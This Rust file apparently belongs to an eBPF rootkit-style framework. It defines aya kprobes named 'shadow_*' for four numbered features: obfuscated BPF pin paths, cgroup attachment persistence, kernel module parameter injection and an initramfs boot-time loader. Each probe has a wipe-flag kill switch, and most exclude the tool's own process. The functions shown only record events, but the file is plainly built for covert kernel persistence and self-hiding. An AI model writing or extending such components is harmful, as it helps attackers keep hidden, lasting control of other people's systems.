use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{
    EventHeader, EVENT_CGROUP_PERSIST, EVENT_INITRAMFS_LOADER, EVENT_MODULE_PARAM_INJECT,
    EVENT_OBFUSCATED_PIN,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 85: BPF Filesystem Pinning (Obfuscated Paths)
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_obfuscated_pin(ctx: ProbeContext) -> u32 {
    try_obfuscated_pin(&ctx).unwrap_or_default()
}

fn try_obfuscated_pin(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let prog_id: u32 = unsafe { ctx.arg::<u32>(0).ok_or(1i64)? };

    if unsafe { PIN_PATH_TABLE.get(&prog_id) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_OBFUSCATED_PIN,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: prog_id as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 86: Cgroup BPF Attachment Persistence
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_cgroup_persist(ctx: ProbeContext) -> u32 {
    try_cgroup_persist(&ctx).unwrap_or_default()
}

fn try_cgroup_persist(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let cgroup_fd: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if let Some(state) = unsafe { CGROUP_PERSIST_STATE.get_ptr_mut(0) } {
        unsafe { *state += 1 };
    }

    let event = EventHeader {
        event_type: EVENT_CGROUP_PERSIST,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: cgroup_fd,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 87: Kernel Module Parameter Injection
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_modparam_inject(ctx: ProbeContext) -> u32 {
    try_modparam_inject(&ctx).unwrap_or_default()
}

fn try_modparam_inject(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let module_addr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { MODPARAM_TARGETS.get(&module_addr) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_MODULE_PARAM_INJECT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: module_addr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 88: Boot-Time BPF Loader via initramfs
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_initramfs_persist(ctx: ProbeContext) -> u32 {
    try_initramfs_persist(&ctx).unwrap_or_default()
}

fn try_initramfs_persist(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let module_name_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if let Some(state) = unsafe { BOOT_LOADER_STATE.get_ptr_mut(0) } {
        let current = unsafe { *state };
        if current == 0 {
            unsafe { *state = 1 };

            let event = EventHeader {
                event_type: EVENT_INITRAMFS_LOADER,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: module_name_ptr,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}
